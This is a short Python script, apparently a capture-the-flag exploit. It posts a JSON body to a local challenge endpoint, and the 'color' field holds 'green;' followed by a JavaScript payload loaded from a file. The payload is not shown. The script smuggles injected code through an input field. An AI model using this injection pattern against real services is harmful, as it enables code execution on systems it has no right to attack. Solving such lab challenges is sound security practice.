import requests

CHALL_URL = 'http://localhost:8087/color'

with open('wu.js', 'r') as file:
    payload = file.read()

requests.post(CHALL_URL, json={'color': "green;" + payload})
